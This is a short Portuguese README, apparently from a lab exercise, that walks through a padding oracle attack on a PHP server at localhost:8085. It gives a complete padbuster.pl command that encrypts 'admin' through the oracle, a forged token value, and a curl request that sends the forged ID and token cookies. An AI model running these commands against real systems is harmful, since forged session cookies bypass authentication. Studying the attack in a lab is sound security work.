

    # Payloads

    Para executa-los sertifique-se de estar rodando o servirdor com as devidas alteracoes 
    
    ./padbuster.pl http://localhost:8085/index.php AAAAAAAAAAAAAAAAAAAAAA== 16 -noiv -encrypt "admin" -cookies "ID=AAAAAAAAAAAAAAAAAAAAAA==;token=AAAAAAAAAAAAAAAAAAAAAA==" -encoding 0 -error "ERROR!"

    o comando gerara uma chave em hexdecimal no output do Padbuster essa chave e ultilizada no script python first_exemple.py gerando a chave final:
    token=gKENdsXk8OgGoDrSp/JXEQ==
    a chave do token e do id sao geradas pelo first_exemple.py ele ultiliza a chave intermediaria gerada pelo comando acima ultilzado no padbuster

    curl -v -H "Cookie: ID=AAAAAAAAAAAAAAAAAAAAAA==; token=gKENdsXk8OgGoDrSp/JXEQ==" http://localhost:8085/index.php
